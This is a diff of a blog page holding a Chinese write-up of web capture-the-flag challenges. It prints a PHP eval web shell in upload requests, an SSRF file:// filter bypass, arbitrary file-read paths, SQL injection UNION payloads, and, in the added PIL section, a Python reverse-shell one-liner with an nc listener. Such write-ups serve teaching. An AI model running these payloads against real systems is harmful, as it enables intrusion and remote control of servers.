@@ -340,6 +340,15 @@
     <!-- Left aligned menu below button -->
     
     
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#绑定host-www-mooctest-net"><span class="post-toc-number">1.</span> <span class="post-toc-text">绑定host www.mooctest.net</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#babyupload"><span class="post-toc-number">2.</span> <span class="post-toc-text">babyupload</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#curl"><span class="post-toc-number">3.</span> <span class="post-toc-text">curl</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#war"><span class="post-toc-number">4.</span> <span class="post-toc-text">war</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#readme2"><span class="post-toc-number">5.</span> <span class="post-toc-text">readme2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#source-ip"><span class="post-toc-number">6.</span> <span class="post-toc-text">source ip</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#hackedsite"><span class="post-toc-number">7.</span> <span class="post-toc-text">hackedsite</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#babysql3"><span class="post-toc-number">8.</span> <span class="post-toc-text">babysql3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#thinkphp5"><span class="post-toc-number">9.</span> <span class="post-toc-text">thinkphp5</span></a></li></ol>
+    </ul>
+    
 
 
 
@@ -478,80 +487,30 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <ul>
-<li>绑定host www.mooctest.net<br>  访问即可得到flag<br><pre><code>按套路应该是改hosts文件，路径为`C:\Windows\System32\drivers\etc`,要用管理员身份才能修改
-然而这题有bug哭唧唧，，坑了窝一半时间
-后来是访问`ip:port/index.php`抓包改了host头过的
-</code></pre></li>
-<li><p>babyupload<br>  不能再简单了<br></p>
-<pre><code>直接点开链接是Forbidden
-扫描目录（或者猜测）得到./upload.php
-发现显示`error:请选择上传文件`，但并没有发现可供上传的页面
-此时有两种姿势
-1.随便找个上传的题，抓个包，repeater里修改一下
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------323842381428372</div><div class="line">Content-Length: 432</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;dir&quot;</div><div class="line"></div><div class="line">/uploads/</div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;mm.php&quot;</div><div class="line">Content-Type: application/php</div><div class="line"></div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;submit&quot;</div><div class="line"></div><div class="line">Submit</div><div class="line">-----------------------------323842381428372--</div></pre></td></tr></table></figure>
-<p>2.寄几写一个上传的html然后提交到它的页面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;form action=&quot;xxxxxxxxxx/upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;upfile&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>此时抓包发现是这样叽哒</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------13123832232625</div><div class="line">Content-Length: 220</div><div class="line">Referer: http://localhost/ti/upfile.html</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------13123832232625</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;mm.php&quot;</div><div class="line">Content-Type: application/php</div><div class="line"></div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div><div class="line">-----------------------------13123832232625--</div></pre></td></tr></table></figure>
-<p>值得注意的是，name=upfile这个是要猜的。。。<br>然后用菜刀/蚁剑链接，flag在/var/www/html下</p>
-</li>
-<li><p>curl<br>  老题目，新waf,新姿势<br></p>
-<pre><code>初始链接为`./index.php?url=http://www.mooctest.net/`
-是一个php写的curl(数据传输)，可以ssrf
-然后用file协议（用于访问本地计算机中的文件）读取源码
-大写绕过waf
-感觉老司机的话都是先读/etc/passwd啊什么的。。。
-`./index.php?url=File://index.php`
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$url = $_GET[&apos;url&apos;];	</div><div class="line">if (preg_match(&quot;/file:[^\w]+/&quot;, $url)) exit(&quot;hacker go away!&quot;);</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;);</div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</div><div class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">$output = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line">$flag = &quot;flag&#123;xxxxxxxxxxxxxxx&#125;&quot;;</div><div class="line">print_r($output);</div></pre></td></tr></table></figure>
-</li>
-<li><p>war<br>  this is a war<br></p>
-<pre><code>源码有提示：`&lt;!--flag就在这个页面，怎么找到源码呢 tips:tomcat部署--&gt;`
-结果直接名字.war就有了，解压出源码。。
-</code></pre></li>
-<li><p>readme2<br>  java go to page<br></p>
-<pre><code>点开帮助（微笑）
-这儿的代码具体是
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;footer&gt;</div><div class="line">  &lt;div id=&quot;help&quot;&gt;帮助&lt;/div&gt;</div><div class="line">&lt;/footer&gt;</div><div class="line">&lt;script src=&quot;js/search.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>然后点开js/search.js是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(function()&#123;</div><div class="line">$(&quot;#help&quot;).click(function()&#123;</div><div class="line">    location.href=&quot;show.do?page=help.jsp&quot;;</div><div class="line">&#125;)</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<p>所以本瞎子是看不出这个能点开的（脸上笑嘻嘻心里mmp）<br>跳转到了<code>./test/show.do?page=help.jsp</code><br>然后搜索Java任意文件读取漏洞<br>找呀找找呀找找到惹<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23587&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">这个</a><br>进入<code>./test/show.do?page=WEB-INF/web.xml</code>查看系统配置文件<br>看到<code>index.jsp ConfigPropertie /WEB-INF/properties/configInfo.properties Index com.cn.dbapp.Index Index /show.do 500 /index.jsp 404 /index.jsp</code><br>进入<code>./test/show.do?page=/WEB-INF/properties/configInfo.properties</code>发现key</p>
-</li>
-<li>source ip<br>  找到目标网站www.mooctest.net 的源ip<pre><code>这题姿势也各种各样~要绕过cdn
-容易想到的是用找回密码探测邮箱ip
-`https://jingyan.baidu.com/article/17bd8e522abb8085ab2bb8b2.html`
-还有就是[这个博客](http://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/)里的姿势啦
-在https://fofa.so/ 搜索title等有标志性的特征源码
-</code></pre></li>
-<li>hackedsite<br>  寻找前人的足迹<pre><code>据嗦啊，疯狂拿字典扫出./upload/phpspy.php然后用默认密码angel登录出flag
-注意扫目录要打开403，forbidden和not found不一样~
-</code></pre></li>
-<li><p>babysql3<br> 注入点为id</p>
-<pre><code>反引号闭合
-猜测代码为
-​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from table where 反引$a反引=$b</div><div class="line">​</div></pre></td></tr></table></figure>
-
-不断探测
-最后payload
-​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keyname=1&amp;name=id反引=0 union select 1,2,反引flag反引 from flag-- </div><div class="line">​</div></pre></td></tr></table></figure>
-
-构造为
-​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from table where 反引id反引=0 union select 1,2,反引flag反引 from flag-- 反引=1</div><div class="line">	​</div></pre></td></tr></table></figure>
-</code></pre></li>
-<li><p>snake<br>  生成一个图片玩玩</p>
-<pre><code>题目地址： http://118.178.18.181:46019/ 
-源码地址: http://114.55.36.69:46011/src.tar 
-python PIL rce
-(待做)
-</code></pre></li>
-<li>thinkphp5<br>  跟waf正面刚！源码html.tar.gz<pre><code>题目地址： http://114.55.91.27:46011/ 
-提示：
-thinkphp5 任意文件删除
-反序列化
-(瑟瑟发抖，坐等小菲菲一血~)
-&lt;br&gt;&lt;br&gt;
-</code></pre></li>
-</ul>
+        <h3 id="绑定host-www-mooctest-net"><a href="#绑定host-www-mooctest-net" class="headerlink" title="绑定host www.mooctest.net"></a>绑定host www.mooctest.net</h3><p>访问即可得到flag<br><br>  按套路应该是改hosts文件，路径为<code>C:\Windows\System32\drivers\etc</code>,要用管理员身份才能修改<br>  然而这题有bug哭唧唧，，坑了窝一半时间<br>  后来是访问<code>ip:port/index.php</code>抓包改了host头过的</p>
+<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><p>不能再简单了<br><br>  直接点开链接是Forbidden<br>  扫描目录（或者猜测）得到./upload.php<br>  发现显示<code>error:请选择上传文件</code>，但并没有发现可供上传的页面<br>  此时有两种姿势<br>  1.随便找个上传的题，抓个包，repeater里修改一下</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------323842381428372</div><div class="line">Content-Length: 432</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;dir&quot;</div><div class="line"></div><div class="line">/uploads/</div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;mm.php&quot;</div><div class="line">Content-Type: application/php</div><div class="line"></div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;submit&quot;</div><div class="line"></div><div class="line">Submit</div><div class="line">-----------------------------323842381428372--</div></pre></td></tr></table></figure>
+<p>  2.寄几写一个上传的html然后提交到它的页面<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;form action=&quot;xxxxxxxxxx/upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;upfile&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>  此时抓包发现是这样叽哒<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------13123832232625</div><div class="line">Content-Length: 220</div><div class="line">Referer: http://localhost/ti/upfile.html</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------13123832232625</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;mm.php&quot;</div><div class="line">Content-Type: application/php</div><div class="line"></div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div><div class="line">-----------------------------13123832232625--</div></pre></td></tr></table></figure></p>
+<p>  值得注意的是，name=upfile这个是要猜的。。。<br>  然后用菜刀/蚁剑链接，flag在/var/www/html下</p>
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>老题目，新waf,新姿势<br><br>  初始链接为<code>./index.php?url=http://www.mooctest.net/</code><br>  是一个php写的curl(数据传输)，可以ssrf<br>  然后用file协议（用于访问本地计算机中的文件）读取源码<br>  大写绕过waf<br>  感觉老司机的话都是先读/etc/passwd啊什么的。。。<br>  <code>./index.php?url=File://index.php</code></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$url = $_GET[&apos;url&apos;];	</div><div class="line">if (preg_match(&quot;/file:[^\w]+/&quot;, $url)) exit(&quot;hacker go away!&quot;);</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;);</div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</div><div class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">$output = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line">$flag = &quot;flag&#123;xxxxxxxxxxxxxxx&#125;&quot;;</div><div class="line">print_r($output);</div></pre></td></tr></table></figure>
+<h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><p>this is a war<br><br>  源码有提示：<code>&lt;!--flag就在这个页面，怎么找到源码呢 tips:tomcat部署--&gt;</code><br>  结果直接名字.war就有了，解压出源码。。</p>
+<h3 id="readme2"><a href="#readme2" class="headerlink" title="readme2"></a>readme2</h3><p>java go to page<br><br>  点开帮助（微笑）<br>  这儿的代码具体是</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;footer&gt;</div><div class="line">  &lt;div id=&quot;help&quot;&gt;帮助&lt;/div&gt;</div><div class="line">&lt;/footer&gt;</div><div class="line">&lt;script src=&quot;js/search.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>  然后点开js/search.js是<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(function()&#123;</div><div class="line">$(&quot;#help&quot;).click(function()&#123;</div><div class="line">    location.href=&quot;show.do?page=help.jsp&quot;;</div><div class="line">&#125;)</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
+<p>  所以本瞎子是看不出这个能点开的（脸上笑嘻嘻心里mmp）<br>  跳转到了<code>./test/show.do?page=help.jsp</code><br>  然后搜索Java任意文件读取漏洞<br>  找呀找找呀找找到惹<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23587&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">这个</a><br>  进入<code>./test/show.do?page=WEB-INF/web.xml</code>查看系统配置文件<br>  看到<code>index.jsp ConfigPropertie /WEB-INF/properties/configInfo.properties Index com.cn.dbapp.Index Index /show.do 500 /index.jsp 404 /index.jsp</code><br>  进入<code>./test/show.do?page=/WEB-INF/properties/configInfo.properties</code>发现key</p>
+<h3 id="source-ip"><a href="#source-ip" class="headerlink" title="source ip"></a>source ip</h3><p>找到目标网站www.mooctest.net 的源ip<br>  这题姿势也各种各样~要绕过cdn<br>  容易想到的是用找回密码探测邮箱ip<br>  <code>https://jingyan.baidu.com/article/17bd8e522abb8085ab2bb8b2.html</code><br>  还有就是<a href="http://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/" target="_blank" rel="external">这个博客</a>里的姿势啦<br>  在<a href="https://fofa.so/" target="_blank" rel="external">https://fofa.so/</a> 搜索title等有标志性的特征源码</p>
+<h3 id="hackedsite"><a href="#hackedsite" class="headerlink" title="hackedsite"></a>hackedsite</h3><p>寻找前人的足迹<br>  据嗦啊，疯狂拿字典扫出./upload/phpspy.php然后用默认密码angel登录出flag<br>  注意扫目录要打开403，forbidden和not found不一样~</p>
+<h3 id="babysql3"><a href="#babysql3" class="headerlink" title="babysql3"></a>babysql3</h3><p>注入点为id</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">反引号闭合</div><div class="line">猜测代码为</div><div class="line">​</div></pre></td></tr></table></figure>
+<p>select * from table where 反引$a反引=$b<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">不断探测</div><div class="line">最后payload</div><div class="line">​</div></pre></td></tr></table></figure></p>
+<p>keyname=1&amp;name=id反引=0 union select 1,2,反引flag反引 from flag–<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">构造为</div><div class="line">​</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">select * from table where 反引id反引=0 union select 1,2,反引flag反引 from flag-- 反引=1</div><div class="line">### snake</div><div class="line"></div><div class="line">生成一个图片玩玩</div><div class="line">  题目地址： http://118.178.18.181:46019/ </div><div class="line">  源码地址: http://114.55.36.69:46011/src.tar </div><div class="line">  python PIL rce</div><div class="line"></div><div class="line">搜索漏洞找到[poc](https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/poc.png)</div><div class="line"></div><div class="line">把命令改成弹shell的（多试几个），最后我使用的好像是</div><div class="line"></div><div class="line">```python</div><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
+<p>然后在vps上监听<code>nc -lvvp 1234</code>就吼啦~</p>
+<h3 id="thinkphp5"><a href="#thinkphp5" class="headerlink" title="thinkphp5"></a>thinkphp5</h3><p>跟waf正面刚！源码html.tar.gz<br>  题目地址： <a href="http://114.55.91.27:46011/" target="_blank" rel="external">http://114.55.91.27:46011/</a><br>  提示：<br>  thinkphp5 任意文件删除<br>  反序列化<br>  (瑟瑟发抖，坐等小菲菲一血~)</p>
+<p> (貌似最后米有人做来)  </p>
+<p><br></p>
 
         
     
@@ -696,7 +655,7 @@ thinkphp5 任意文件删除
             </a>
             <ul class="dropdown-menu">
                 <li>
-                <a class="sidebar_archives-link" href="/categories/Blog/">Blog<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/categories/Diary/">Diary<span class="sidebar_archives-count">5</span></a>
+                <a class="sidebar_archives-link" href="/categories/Blog/">Blog<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/categories/Diary/">Diary<span class="sidebar_archives-count">5</span></a>
             </ul>
         </li>
         
